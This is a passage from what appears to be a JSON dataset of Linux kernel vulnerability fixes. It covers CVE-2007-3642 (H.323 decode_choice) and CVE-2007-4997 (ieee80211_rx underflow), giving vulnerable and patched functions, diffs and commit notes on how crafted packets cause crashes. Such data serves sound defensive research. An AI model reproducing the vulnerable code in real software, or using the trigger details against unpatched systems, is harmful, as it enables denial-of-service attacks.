        "func": "int decode_seq(bitstr_t * bs, field_t * f, char *base, int level)\n{\n\tunsigned ext, bmp, i, opt, len = 0, bmp2, bmp2_len;\n\tint err;\n\tfield_t *son;\n\tunsigned char *beg = NULL;\n\n\tPRINT(\"%*.s%s\\n\", level * TAB_SIZE, \" \", f->name);\n\n\t/* Decode? */\n\tbase = (base && (f->attr & DECODE)) ? base + f->offset : NULL;\n\n\t/* Extensible? */\n\text = (f->attr & EXT) ? get_bit(bs) : 0;\n\n\t/* Get fields bitmap */\n\tbmp = get_bitmap(bs, f->sz);\n\tif (base)\n\t\t*(unsigned *) base = bmp;\n\n\t/* Decode the root components */\n\tfor (i = opt = 0, son = f->fields; i < f->lb; i++, son++) {\n\t\tif (son->attr & STOP) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\treturn H323_ERROR_STOP;\n\t\t}\n\n\t\tif (son->attr & OPT) {\t/* Optional component */\n\t\t\tif (!((0x80000000U >> (opt++)) & bmp))\t/* Not exist */\n\t\t\t\tcontinue;\n\t\t}\n\n\t\t/* Decode */\n\t\tif (son->attr & OPEN) {\t/* Open field */\n\t\t\tCHECK_BOUND(bs, 2);\n\t\t\tlen = get_len(bs);\n\t\t\tCHECK_BOUND(bs, len);\n\t\t\tif (!base || !(son->attr & DECODE)) {\n\t\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE,\n\t\t\t\t      \" \", son->name);\n\t\t\t\tbs->cur += len;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbeg = bs->cur;\n\n\t\t\t/* Decode */\n\t\t\tif ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t\t  level + 1)) <\n\t\t\t    H323_ERROR_NONE)\n\t\t\t\treturn err;\n\n\t\t\tbs->cur = beg + len;\n\t\t\tbs->bit = 0;\n\t\t} else if ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t\t level + 1)) <\n\t\t\t   H323_ERROR_NONE)\n\t\t\treturn err;\n\t}\n\n\t/* No extension? */\n\tif (!ext)\n\t\treturn H323_ERROR_NONE;\n\n\t/* Get the extension bitmap */\n\tbmp2_len = get_bits(bs, 7) + 1;\n\tCHECK_BOUND(bs, (bmp2_len + 7) >> 3);\n\tbmp2 = get_bitmap(bs, bmp2_len);\n\tbmp |= bmp2 >> f->sz;\n\tif (base)\n\t\t*(unsigned *) base = bmp;\n\tBYTE_ALIGN(bs);\n\n\t/* Decode the extension components */\n\tfor (opt = 0; opt < bmp2_len; opt++, i++, son++) {\n\t\tif (i < f->ub && son->attr & STOP) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\treturn H323_ERROR_STOP;\n\t\t}\n\n\t\tif (!((0x80000000 >> opt) & bmp2))\t/* Not present */\n\t\t\tcontinue;\n\n\t\t/* Check Range */\n\t\tif (i >= f->ub) {\t/* Newer Version? */\n\t\t\tCHECK_BOUND(bs, 2);\n\t\t\tlen = get_len(bs);\n\t\t\tCHECK_BOUND(bs, len);\n\t\t\tbs->cur += len;\n\t\t\tcontinue;\n\t\t}\n\n\t\tCHECK_BOUND(bs, 2);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tif (!base || !(son->attr & DECODE)) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\tbs->cur += len;\n\t\t\tcontinue;\n\t\t}\n\t\tbeg = bs->cur;\n\n\t\tif ((err = (Decoders[son->type]) (bs, son, base,\n\t\t\t\t\t\t  level + 1)) <\n\t\t    H323_ERROR_NONE)\n\t\t\treturn err;\n\n\t\tbs->cur = beg + len;\n\t\tbs->bit = 0;\n\t}\n\treturn H323_ERROR_NONE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -36,7 +36,7 @@\n \t\t\tCHECK_BOUND(bs, 2);\n \t\t\tlen = get_len(bs);\n \t\t\tCHECK_BOUND(bs, len);\n-\t\t\tif (!base) {\n+\t\t\tif (!base || !(son->attr & DECODE)) {\n \t\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE,\n \t\t\t\t      \" \", son->name);\n \t\t\t\tbs->cur += len;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\tif (!base) {"
            ],
            "added_lines": [
                "\t\t\tif (!base || !(son->attr & DECODE)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2007-3642",
        "func_name": "torvalds/linux/decode_choice",
        "description": "The decode_choice function in net/netfilter/nf_conntrack_h323_asn1.c in the Linux kernel before 2.6.20.15, 2.6.21.x before 2.6.21.6, and before 2.6.22 allows remote attackers to cause a denial of service (crash) via an encoded, out-of-range index value for a choice field, which triggers a NULL pointer dereference.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commit;h=25845b5155b55cd77e42655ec24161ba3feffa47",
        "commit_title": "Choices' index values may be out of range while still encoded in the fixed",
        "commit_text": "length bit-field. This bug may cause access to undefined types (NULL pointers) and thus crashes (Reported by Zhongling Wen).  This patch also adds checking of decode flag when decoding SEQUENCEs.  ",
        "func_before": "int decode_choice(bitstr_t * bs, field_t * f, char *base, int level)\n{\n\tunsigned type, ext, len = 0;\n\tint err;\n\tfield_t *son;\n\tunsigned char *beg = NULL;\n\n\tPRINT(\"%*.s%s\\n\", level * TAB_SIZE, \" \", f->name);\n\n\t/* Decode? */\n\tbase = (base && (f->attr & DECODE)) ? base + f->offset : NULL;\n\n\t/* Decode the choice index number */\n\tif ((f->attr & EXT) && get_bit(bs)) {\n\t\text = 1;\n\t\ttype = get_bits(bs, 7) + f->lb;\n\t} else {\n\t\text = 0;\n\t\ttype = get_bits(bs, f->sz);\n\t}\n\n\t/* Write Type */\n\tif (base)\n\t\t*(unsigned *) base = type;\n\n\t/* Check Range */\n\tif (type >= f->ub) {\t/* Newer version? */\n\t\tBYTE_ALIGN(bs);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tbs->cur += len;\n\t\treturn H323_ERROR_NONE;\n\t}\n\n\t/* Transfer to son level */\n\tson = &f->fields[type];\n\tif (son->attr & STOP) {\n\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \", son->name);\n\t\treturn H323_ERROR_STOP;\n\t}\n\n\tif (ext || (son->attr & OPEN)) {\n\t\tBYTE_ALIGN(bs);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tif (!base || !(son->attr & DECODE)) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\tbs->cur += len;\n\t\t\treturn H323_ERROR_NONE;\n\t\t}\n\t\tbeg = bs->cur;\n\n\t\tif ((err = (Decoders[son->type]) (bs, son, base, level + 1)) <\n\t\t    H323_ERROR_NONE)\n\t\t\treturn err;\n\n\t\tbs->cur = beg + len;\n\t\tbs->bit = 0;\n\t} else if ((err = (Decoders[son->type]) (bs, son, base, level + 1)) <\n\t\t   H323_ERROR_NONE)\n\t\treturn err;\n\n\treturn H323_ERROR_NONE;\n}",
        "func": "int decode_choice(bitstr_t * bs, field_t * f, char *base, int level)\n{\n\tunsigned type, ext, len = 0;\n\tint err;\n\tfield_t *son;\n\tunsigned char *beg = NULL;\n\n\tPRINT(\"%*.s%s\\n\", level * TAB_SIZE, \" \", f->name);\n\n\t/* Decode? */\n\tbase = (base && (f->attr & DECODE)) ? base + f->offset : NULL;\n\n\t/* Decode the choice index number */\n\tif ((f->attr & EXT) && get_bit(bs)) {\n\t\text = 1;\n\t\ttype = get_bits(bs, 7) + f->lb;\n\t} else {\n\t\text = 0;\n\t\ttype = get_bits(bs, f->sz);\n\t\tif (type >= f->lb)\n\t\t\treturn H323_ERROR_RANGE;\n\t}\n\n\t/* Write Type */\n\tif (base)\n\t\t*(unsigned *) base = type;\n\n\t/* Check Range */\n\tif (type >= f->ub) {\t/* Newer version? */\n\t\tBYTE_ALIGN(bs);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tbs->cur += len;\n\t\treturn H323_ERROR_NONE;\n\t}\n\n\t/* Transfer to son level */\n\tson = &f->fields[type];\n\tif (son->attr & STOP) {\n\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \", son->name);\n\t\treturn H323_ERROR_STOP;\n\t}\n\n\tif (ext || (son->attr & OPEN)) {\n\t\tBYTE_ALIGN(bs);\n\t\tlen = get_len(bs);\n\t\tCHECK_BOUND(bs, len);\n\t\tif (!base || !(son->attr & DECODE)) {\n\t\t\tPRINT(\"%*.s%s\\n\", (level + 1) * TAB_SIZE, \" \",\n\t\t\t      son->name);\n\t\t\tbs->cur += len;\n\t\t\treturn H323_ERROR_NONE;\n\t\t}\n\t\tbeg = bs->cur;\n\n\t\tif ((err = (Decoders[son->type]) (bs, son, base, level + 1)) <\n\t\t    H323_ERROR_NONE)\n\t\t\treturn err;\n\n\t\tbs->cur = beg + len;\n\t\tbs->bit = 0;\n\t} else if ((err = (Decoders[son->type]) (bs, son, base, level + 1)) <\n\t\t   H323_ERROR_NONE)\n\t\treturn err;\n\n\treturn H323_ERROR_NONE;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -17,6 +17,8 @@\n \t} else {\n \t\text = 0;\n \t\ttype = get_bits(bs, f->sz);\n+\t\tif (type >= f->lb)\n+\t\t\treturn H323_ERROR_RANGE;\n \t}\n \n \t/* Write Type */",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\tif (type >= f->lb)",
                "\t\t\treturn H323_ERROR_RANGE;"
            ]
        }
    },
    {
        "cve_id": "CVE-2007-4997",
        "func_name": "kernel/git/avi/kvm/ieee80211_rx",
        "description": "Integer underflow in the ieee80211_rx function in net/ieee80211/ieee80211_rx.c in the Linux kernel 2.6.x before 2.6.23 allows remote attackers to cause a denial of service (crash) via a crafted SKB length value in a runt IEEE 802.11 frame when the IEEE80211_STYPE_QOS_DATA flag is set, aka an \"off-by-two error.\"",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/avi/kvm.git;a=commitdiff;h=04045f98e0457aba7d4e6736f37eed189c48a5f7",
        "commit_title": "Reported by Chris Evans <scarybeasts@gmail.com>:",
        "commit_text": " > The summary is that an evil 80211 frame can crash out a victim's > machine. It only applies to drivers using the 80211 wireless code, and > only then to certain drivers (and even then depends on a card's > firmware not dropping a dubious packet). I must confess I'm not > keeping track of Linux wireless support, and the different protocol > stacks etc. > > Details are as follows: > > ieee80211_rx() does not explicitly check that \"skb->len >= hdrlen\". > There are other skb->len checks, but not enough to prevent a subtle > off-by-two error if the frame has the IEEE80211_STYPE_QOS_DATA flag > set. > > This leads to integer underflow and crash here: > > if (frag != 0) >    flen -= hdrlen; > > (flen is subsequently used as a memcpy length parameter).  How about this?  ",
        "func_before": "int ieee80211_rx(struct ieee80211_device *ieee, struct sk_buff *skb,\n\t\t struct ieee80211_rx_stats *rx_stats)\n{\n\tstruct net_device *dev = ieee->dev;\n\tstruct ieee80211_hdr_4addr *hdr;\n\tsize_t hdrlen;\n\tu16 fc, type, stype, sc;\n\tstruct net_device_stats *stats;\n\tunsigned int frag;\n\tu8 *payload;\n\tu16 ethertype;\n#ifdef NOT_YET\n\tstruct net_device *wds = NULL;\n\tstruct sk_buff *skb2 = NULL;\n\tstruct net_device *wds = NULL;\n\tint frame_authorized = 0;\n\tint from_assoc_ap = 0;\n\tvoid *sta = NULL;\n#endif\n\tu8 dst[ETH_ALEN];\n\tu8 src[ETH_ALEN];\n\tstruct ieee80211_crypt_data *crypt = NULL;\n\tint keyidx = 0;\n\tint can_be_decrypted = 0;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\tstats = &ieee->stats;\n\n\tif (skb->len < 10) {\n\t\tprintk(KERN_INFO \"%s: SKB length < 10\\n\", dev->name);\n\t\tgoto rx_dropped;\n\t}\n\n\tfc = le16_to_cpu(hdr->frame_ctl);\n\ttype = WLAN_FC_GET_TYPE(fc);\n\tstype = WLAN_FC_GET_STYPE(fc);\n\tsc = le16_to_cpu(hdr->seq_ctl);\n\tfrag = WLAN_GET_SEQ_FRAG(sc);\n\thdrlen = ieee80211_get_hdrlen(fc);\n\n\t/* Put this code here so that we avoid duplicating it in all\n\t * Rx paths. - Jean II */\n#ifdef CONFIG_WIRELESS_EXT\n#ifdef IW_WIRELESS_SPY\t\t/* defined in iw_handler.h */\n\t/* If spy monitoring on */\n\tif (ieee->spy_data.spy_number > 0) {\n\t\tstruct iw_quality wstats;\n\n\t\twstats.updated = 0;\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_RSSI) {\n\t\t\twstats.level = rx_stats->rssi;\n\t\t\twstats.updated |= IW_QUAL_LEVEL_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_LEVEL_INVALID;\n\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_NOISE) {\n\t\t\twstats.noise = rx_stats->noise;\n\t\t\twstats.updated |= IW_QUAL_NOISE_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_NOISE_INVALID;\n\n\t\tif (rx_stats->mask & IEEE80211_STATMASK_SIGNAL) {\n\t\t\twstats.qual = rx_stats->signal;\n\t\t\twstats.updated |= IW_QUAL_QUAL_UPDATED;\n\t\t} else\n\t\t\twstats.updated |= IW_QUAL_QUAL_INVALID;\n\n\t\t/* Update spy records */\n\t\twireless_spy_update(ieee->dev, hdr->addr2, &wstats);\n\t}\n#endif\t\t\t\t/* IW_WIRELESS_SPY */\n#endif\t\t\t\t/* CONFIG_WIRELESS_EXT */\n\n#ifdef NOT_YET\n\thostap_update_rx_stats(local->ap, hdr, rx_stats);\n#endif\n\n\tif (ieee->iw_mode == IW_MODE_MONITOR) {\n\t\tstats->rx_packets++;\n\t\tstats->rx_bytes += skb->len;\n\t\tieee80211_monitor_rx(ieee, skb, rx_stats);\n\t\treturn 1;\n\t}\n\n\tcan_be_decrypted = (is_multicast_ether_addr(hdr->addr1) ||\n\t\t\t    is_broadcast_ether_addr(hdr->addr2)) ?\n\t    ieee->host_mc_decrypt : ieee->host_decrypt;\n\n\tif (can_be_decrypted) {\n\t\tif (skb->len >= hdrlen + 3) {\n\t\t\t/* Top two-bits of byte 3 are the key index */\n\t\t\tkeyidx = skb->data[hdrlen + 3] >> 6;\n\t\t}\n\n\t\t/* ieee->crypt[] is WEP_KEY (4) in length.  Given that keyidx\n\t\t * is only allowed 2-bits of storage, no value of keyidx can\n\t\t * be provided via above code that would result in keyidx\n\t\t * being out of range */\n\t\tcrypt = ieee->crypt[keyidx];\n\n#ifdef NOT_YET\n\t\tsta = NULL;\n\n\t\t/* Use station specific key to override default keys if the\n\t\t * receiver address is a unicast address (\"individual RA\"). If\n\t\t * bcrx_sta_key parameter is set, station specific key is used\n\t\t * even with broad/multicast targets (this is against IEEE\n\t\t * 802.11, but makes it easier to use different keys with\n\t\t * stations that do not support WEP key mapping). */\n\n\t\tif (!(hdr->addr1[0] & 0x01) || local->bcrx_sta_key)\n\t\t\t(void)hostap_handle_sta_crypto(local, hdr, &crypt,\n\t\t\t\t\t\t       &sta);\n#endif\n\n\t\t/* allow NULL decrypt to indicate an station specific override\n\t\t * for default encryption */\n\t\tif (crypt && (crypt->ops == NULL ||\n\t\t\t      crypt->ops->decrypt_mpdu == NULL))\n\t\t\tcrypt = NULL;\n\n\t\tif (!crypt && (fc & IEEE80211_FCTL_PROTECTED)) {\n\t\t\t/* This seems to be triggered by some (multicast?)\n\t\t\t * frames from other than current BSS, so just drop the\n\t\t\t * frames silently instead of filling system log with\n\t\t\t * these reports. */\n\t\t\tIEEE80211_DEBUG_DROP(\"Decryption failed (not set)\"\n\t\t\t\t\t     \" (SA=\" MAC_FMT \")\\n\",\n\t\t\t\t\t     MAC_ARG(hdr->addr2));\n\t\t\tieee->ieee_stats.rx_discards_undecryptable++;\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n#ifdef NOT_YET\n\tif (type != WLAN_FC_TYPE_DATA) {\n\t\tif (type == WLAN_FC_TYPE_MGMT && stype == WLAN_FC_STYPE_AUTH &&\n\t\t    fc & IEEE80211_FCTL_PROTECTED && ieee->host_decrypt &&\n\t\t    (keyidx = hostap_rx_frame_decrypt(ieee, skb, crypt)) < 0) {\n\t\t\tprintk(KERN_DEBUG \"%s: failed to decrypt mgmt::auth \"\n\t\t\t       \"from \" MAC_FMT \"\\n\", dev->name,\n\t\t\t       MAC_ARG(hdr->addr2));\n\t\t\t/* TODO: could inform hostapd about this so that it\n\t\t\t * could send auth failure report */\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tif (ieee80211_rx_frame_mgmt(ieee, skb, rx_stats, type, stype))\n\t\t\tgoto rx_dropped;\n\t\telse\n\t\t\tgoto rx_exit;\n\t}\n#endif\n\t/* drop duplicate 802.11 retransmissions (IEEE 802.11 Chap. 9.29) */\n\tif (sc == ieee->prev_seq_ctl)\n\t\tgoto rx_dropped;\n\telse\n\t\tieee->prev_seq_ctl = sc;\n\n\t/* Data frame - extract src/dst addresses */\n\tif (skb->len < IEEE80211_3ADDR_LEN)\n\t\tgoto rx_dropped;\n\n\tswitch (fc & (IEEE80211_FCTL_FROMDS | IEEE80211_FCTL_TODS)) {\n\tcase IEEE80211_FCTL_FROMDS:\n\t\tmemcpy(dst, hdr->addr1, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr3, ETH_ALEN);\n\t\tbreak;\n\tcase IEEE80211_FCTL_TODS:\n\t\tmemcpy(dst, hdr->addr3, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr2, ETH_ALEN);\n\t\tbreak;\n\tcase IEEE80211_FCTL_FROMDS | IEEE80211_FCTL_TODS:\n\t\tif (skb->len < IEEE80211_4ADDR_LEN)\n\t\t\tgoto rx_dropped;\n\t\tmemcpy(dst, hdr->addr3, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr4, ETH_ALEN);\n\t\tbreak;\n\tcase 0:\n\t\tmemcpy(dst, hdr->addr1, ETH_ALEN);\n\t\tmemcpy(src, hdr->addr2, ETH_ALEN);\n\t\tbreak;\n\t}\n\n#ifdef NOT_YET\n\tif (hostap_rx_frame_wds(ieee, hdr, fc, &wds))\n\t\tgoto rx_dropped;\n\tif (wds) {\n\t\tskb->dev = dev = wds;\n\t\tstats = hostap_get_stats(dev);\n\t}\n\n\tif (ieee->iw_mode == IW_MODE_MASTER && !wds &&\n\t    (fc & (IEEE80211_FCTL_TODS | IEEE80211_FCTL_FROMDS)) ==\n\t    IEEE80211_FCTL_FROMDS && ieee->stadev\n\t    && !compare_ether_addr(hdr->addr2, ieee->assoc_ap_addr)) {\n\t\t/* Frame from BSSID of the AP for which we are a client */\n\t\tskb->dev = dev = ieee->stadev;\n\t\tstats = hostap_get_stats(dev);\n\t\tfrom_assoc_ap = 1;\n\t}\n#endif\n\n\tdev->last_rx = jiffies;\n\n#ifdef NOT_YET\n\tif ((ieee->iw_mode == IW_MODE_MASTER ||\n\t     ieee->iw_mode == IW_MODE_REPEAT) && !from_assoc_ap) {\n\t\tswitch (hostap_handle_sta_rx(ieee, dev, skb, rx_stats,\n\t\t\t\t\t     wds != NULL)) {\n\t\tcase AP_RX_CONTINUE_NOT_AUTHORIZED:\n\t\t\tframe_authorized = 0;\n\t\t\tbreak;\n\t\tcase AP_RX_CONTINUE:\n\t\t\tframe_authorized = 1;\n\t\t\tbreak;\n\t\tcase AP_RX_DROP:\n\t\t\tgoto rx_dropped;\n\t\tcase AP_RX_EXIT:\n\t\t\tgoto rx_exit;\n\t\t}\n\t}\n#endif\n\n\t/* Nullfunc frames may have PS-bit set, so they must be passed to\n\t * hostap_handle_sta_rx() before being dropped here. */\n\n\tstype &= ~IEEE80211_STYPE_QOS_DATA;\n\n\tif (stype != IEEE80211_STYPE_DATA &&\n\t    stype != IEEE80211_STYPE_DATA_CFACK &&\n\t    stype != IEEE80211_STYPE_DATA_CFPOLL &&\n\t    stype != IEEE80211_STYPE_DATA_CFACKPOLL) {\n\t\tif (stype != IEEE80211_STYPE_NULLFUNC)\n\t\t\tIEEE80211_DEBUG_DROP(\"RX: dropped data frame \"\n\t\t\t\t\t     \"with no data (type=0x%02x, \"\n\t\t\t\t\t     \"subtype=0x%02x, len=%d)\\n\",\n\t\t\t\t\t     type, stype, skb->len);\n\t\tgoto rx_dropped;\n\t}\n\n\t/* skb: hdr + (possibly fragmented, possibly encrypted) payload */\n\n\tif ((fc & IEEE80211_FCTL_PROTECTED) && can_be_decrypted &&\n\t    (keyidx = ieee80211_rx_frame_decrypt(ieee, skb, crypt)) < 0)\n\t\tgoto rx_dropped;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\n\t/* skb: hdr + (possibly fragmented) plaintext payload */\n\t// PR: FIXME: hostap has additional conditions in the \"if\" below:\n\t// ieee->host_decrypt && (fc & IEEE80211_FCTL_PROTECTED) &&\n\tif ((frag != 0) || (fc & IEEE80211_FCTL_MOREFRAGS)) {\n\t\tint flen;\n\t\tstruct sk_buff *frag_skb = ieee80211_frag_cache_get(ieee, hdr);\n\t\tIEEE80211_DEBUG_FRAG(\"Rx Fragment received (%u)\\n\", frag);\n\n\t\tif (!frag_skb) {\n\t\t\tIEEE80211_DEBUG(IEEE80211_DL_RX | IEEE80211_DL_FRAG,\n\t\t\t\t\t\"Rx cannot get skb from fragment \"\n\t\t\t\t\t\"cache (morefrag=%d seq=%u frag=%u)\\n\",\n\t\t\t\t\t(fc & IEEE80211_FCTL_MOREFRAGS) != 0,\n\t\t\t\t\tWLAN_GET_SEQ_SEQ(sc), frag);\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tflen = skb->len;\n\t\tif (frag != 0)\n\t\t\tflen -= hdrlen;\n\n\t\tif (frag_skb->tail + flen > frag_skb->end) {\n\t\t\tprintk(KERN_WARNING \"%s: host decrypted and \"\n\t\t\t       \"reassembled frame did not fit skb\\n\",\n\t\t\t       dev->name);\n\t\t\tieee80211_frag_cache_invalidate(ieee, hdr);\n\t\t\tgoto rx_dropped;\n\t\t}\n\n\t\tif (frag == 0) {\n\t\t\t/* copy first fragment (including full headers) into\n\t\t\t * beginning of the fragment cache skb */\n\t\t\tskb_copy_from_linear_data(skb, skb_put(frag_skb, flen), flen);\n\t\t} else {\n\t\t\t/* append frame payload to the end of the fragment\n\t\t\t * cache skb */\n\t\t\tskb_copy_from_linear_data_offset(skb, hdrlen,\n\t\t\t\t      skb_put(frag_skb, flen), flen);\n\t\t}\n\t\tdev_kfree_skb_any(skb);\n\t\tskb = NULL;\n\n\t\tif (fc & IEEE80211_FCTL_MOREFRAGS) {\n\t\t\t/* more fragments expected - leave the skb in fragment\n\t\t\t * cache for now; it will be delivered to upper layers\n\t\t\t * after all fragments have been received */\n\t\t\tgoto rx_exit;\n\t\t}\n\n\t\t/* this was the last fragment and the frame will be\n\t\t * delivered, so remove skb from fragment cache */\n\t\tskb = frag_skb;\n\t\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\t\tieee80211_frag_cache_invalidate(ieee, hdr);\n\t}\n\n\t/* skb: hdr + (possible reassembled) full MSDU payload; possibly still\n\t * encrypted/authenticated */\n\tif ((fc & IEEE80211_FCTL_PROTECTED) && can_be_decrypted &&\n\t    ieee80211_rx_frame_decrypt_msdu(ieee, skb, keyidx, crypt))\n\t\tgoto rx_dropped;\n\n\thdr = (struct ieee80211_hdr_4addr *)skb->data;\n\tif (crypt && !(fc & IEEE80211_FCTL_PROTECTED) && !ieee->open_wep) {\n\t\tif (\t\t/*ieee->ieee802_1x && */\n\t\t\t   ieee80211_is_eapol_frame(ieee, skb)) {\n\t\t\t/* pass unencrypted EAPOL frames even if encryption is\n\t\t\t * configured */\n\t\t} else {\n\t\t\tIEEE80211_DEBUG_DROP(\"encryption configured, but RX \"\n\t\t\t\t\t     \"frame not encrypted (SA=\" MAC_FMT\n\t\t\t\t\t     \")\\n\", MAC_ARG(hdr->addr2));\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n\n\tif (crypt && !(fc & IEEE80211_FCTL_PROTECTED) && !ieee->open_wep &&\n\t    !ieee80211_is_eapol_frame(ieee, skb)) {\n\t\tIEEE80211_DEBUG_DROP(\"dropped unencrypted RX data \"\n\t\t\t\t     \"frame from \" MAC_FMT\n\t\t\t\t     \" (drop_unencrypted=1)\\n\",\n\t\t\t\t     MAC_ARG(hdr->addr2));\n\t\tgoto rx_dropped;\n\t}\n\n\t/* If the frame was decrypted in hardware, we may need to strip off\n\t * any security data (IV, ICV, etc) that was left behind */\n\tif (!can_be_decrypted && (fc & IEEE80211_FCTL_PROTECTED) &&\n\t    ieee->host_strip_iv_icv) {\n\t\tint trimlen = 0;\n\n\t\t/* Top two-bits of byte 3 are the key index */\n\t\tif (skb->len >= hdrlen + 3)\n\t\t\tkeyidx = skb->data[hdrlen + 3] >> 6;\n\n\t\t/* To strip off any security data which appears before the\n\t\t * payload, we simply increase hdrlen (as the header gets\n\t\t * chopped off immediately below). For the security data which\n\t\t * appears after the payload, we use skb_trim. */\n\n\t\tswitch (ieee->sec.encode_alg[keyidx]) {\n\t\tcase SEC_ALG_WEP:\n\t\t\t/* 4 byte IV */\n\t\t\thdrlen += 4;\n\t\t\t/* 4 byte ICV */\n\t\t\ttrimlen = 4;\n\t\t\tbreak;\n\t\tcase SEC_ALG_TKIP:\n\t\t\t/* 4 byte IV, 4 byte ExtIV */\n\t\t\thdrlen += 8;\n\t\t\t/* 8 byte MIC, 4 byte ICV */\n\t\t\ttrimlen = 12;\n\t\t\tbreak;\n\t\tcase SEC_ALG_CCMP:\n\t\t\t/* 8 byte CCMP header */\n\t\t\thdrlen += 8;\n\t\t\t/* 8 byte MIC */\n\t\t\ttrimlen = 8;\n\t\t\tbreak;\n\t\t}\n\n\t\tif (skb->len < trimlen)\n\t\t\tgoto rx_dropped;\n\n\t\t__skb_trim(skb, skb->len - trimlen);\n\n\t\tif (skb->len < hdrlen)\n\t\t\tgoto rx_dropped;\n\t}\n\n\t/* skb: hdr + (possible reassembled) full plaintext payload */\n\n\tpayload = skb->data + hdrlen;\n\tethertype = (payload[6] << 8) | payload[7];\n\n#ifdef NOT_YET\n\t/* If IEEE 802.1X is used, check whether the port is authorized to send\n\t * the received frame. */\n\tif (ieee->ieee802_1x && ieee->iw_mode == IW_MODE_MASTER) {\n\t\tif (ethertype == ETH_P_PAE) {\n\t\t\tprintk(KERN_DEBUG \"%s: RX: IEEE 802.1X frame\\n\",\n\t\t\t       dev->name);\n\t\t\tif (ieee->hostapd && ieee->apdev) {\n\t\t\t\t/* Send IEEE 802.1X frames to the user\n\t\t\t\t * space daemon for processing */\n\t\t\t\tprism2_rx_80211(ieee->apdev, skb, rx_stats,\n\t\t\t\t\t\tPRISM2_RX_MGMT);\n\t\t\t\tieee->apdevstats.rx_packets++;\n\t\t\t\tieee->apdevstats.rx_bytes += skb->len;\n\t\t\t\tgoto rx_exit;\n\t\t\t}\n\t\t} else if (!frame_authorized) {\n\t\t\tprintk(KERN_DEBUG \"%s: dropped frame from \"\n\t\t\t       \"unauthorized port (IEEE 802.1X): \"\n\t\t\t       \"ethertype=0x%04x\\n\", dev->name, ethertype);\n\t\t\tgoto rx_dropped;\n\t\t}\n\t}\n#endif\n\n\t/* convert hdr + possible LLC headers into Ethernet header */\n\tif (skb->len - hdrlen >= 8 &&\n\t    ((memcmp(payload, rfc1042_header, SNAP_SIZE) == 0 &&\n\t      ethertype != ETH_P_AARP && ethertype != ETH_P_IPX) ||\n\t     memcmp(payload, bridge_tunnel_header, SNAP_SIZE) == 0)) {\n\t\t/* remove RFC1042 or Bridge-Tunnel encapsulation and\n\t\t * replace EtherType */\n\t\tskb_pull(skb, hdrlen + SNAP_SIZE);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), src, ETH_ALEN);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), dst, ETH_ALEN);\n\t} else {\n\t\tu16 len;\n\t\t/* Leave Ethernet header part of hdr and full payload */\n\t\tskb_pull(skb, hdrlen);\n\t\tlen = htons(skb->len);\n\t\tmemcpy(skb_push(skb, 2), &len, 2);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), src, ETH_ALEN);\n\t\tmemcpy(skb_push(skb, ETH_ALEN), dst, ETH_ALEN);\n\t}\n\n#ifdef NOT_YET\n\tif (wds && ((fc & (IEEE80211_FCTL_TODS | IEEE80211_FCTL_FROMDS)) ==\n\t\t    IEEE80211_FCTL_TODS) && skb->len >= ETH_HLEN + ETH_ALEN) {\n\t\t/* Non-standard frame: get addr4 from its bogus location after\n\t\t * the payload */\n\t\tskb_copy_to_linear_data_offset(skb, ETH_ALEN,\n\t\t\t\t\t       skb->data + skb->len - ETH_ALEN,\n\t\t\t\t\t       ETH_ALEN);\n\t\tskb_trim(skb, skb->len - ETH_ALEN);\n\t}\n#endif\n\n\tstats->rx_packets++;\n\tstats->rx_bytes += skb->len;\n\n#ifdef NOT_YET\n\tif (ieee->iw_mode == IW_MODE_MASTER && !wds && ieee->ap->bridge_packets) {\n\t\tif (dst[0] & 0x01) {\n\t\t\t/* copy multicast frame both to the higher layers and\n\t\t\t * to the wireless media */\n\t\t\tieee->ap->bridged_multicast++;\n\t\t\tskb2 = skb_clone(skb, GFP_ATOMIC);\n\t\t\tif (skb2 == NULL)\n\t\t\t\tprintk(KERN_DEBUG \"%s: skb_clone failed for \"\n\t\t\t\t       \"multicast frame\\n\", dev->name);\n\t\t} else if 